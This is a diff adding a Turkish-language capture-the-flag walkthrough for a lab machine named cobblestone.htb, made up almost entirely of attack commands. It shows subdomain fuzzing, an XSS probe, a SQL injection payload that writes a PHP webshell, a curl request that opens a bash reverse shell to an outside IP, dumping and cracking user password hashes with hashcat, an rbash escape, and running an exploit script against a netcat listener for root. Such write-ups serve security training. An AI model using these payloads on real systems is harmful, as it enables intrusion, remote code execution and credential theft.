@@ -1,0 +1,72 @@
+## Keşif
+
+```bash
+nmap -sCV -p- -v ip 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
+80/tcp open  http    Apache httpd 2.4.62
+
+
+Host header'da cobblestone.htb vardı.
+echo "10.129.54.140 cobblestone.htb" | sudo tee -a /etc/hosts
+
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://FUZZ.cobblestone.htb
+
+deploy.cobblestone.htb
+vote.cobblestone.htb
+
+echo "ip deploy.cobblestone.htb vote.cobblestone.htb" | sudo tee -a /etc/hosts
+
+XSS
+
+skins.php'de kayıt olup giriş yaptım. Skin URL girişi vardı, XSS denedim. Kendi server'ıma URL verdim, bot geldi. XSS çalışıyor.
+SQL Injection
+
+vote.cobblestone.htb'de SQL injection buldum. Union ile webshell yazdım.
+
+' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php" -- -
+
+curl http://cobblestone.htb/shell.php?cmd=id
+
+curl http://cobblestone.htb/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.75/4444%200%3E%261%22
+
+$db_user = "dbuser";
+$db_pass = "*";
+$db_name = "*";
+
+mysql -u dbuser -p'*' *
+
+SELECT username, password FROM users;
+
+* | *
+
+hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+
+ssh *@cobblestone.htb
+
+cat user.txt
+*
+rbash ile karşılaştım.
+
+ssh -t *@cobblestone.htb "/bin/bash --noprofile --norc"
+
+Rbash Bypass
+
+ssh -t *@cobblestone.htb "/bin/bash --noprofile --norc"
+
+ssh -L 25151:127.0.0.1:25151 *@cobblestone.htb
+
+------------------------------------------------
+eklediğim exploit dosyasını kendi kalinizde nano exploit.py diyerek,
+
+o kodu yapıştırın sonra python3 exploit.py yapmadan önce nc --lnvp 9001 portunda dinledikten sonra çalıştıırn.
+
+ondan sonra rootsunuz.
+
+cat /root/root.txt
+
+
+
+
+
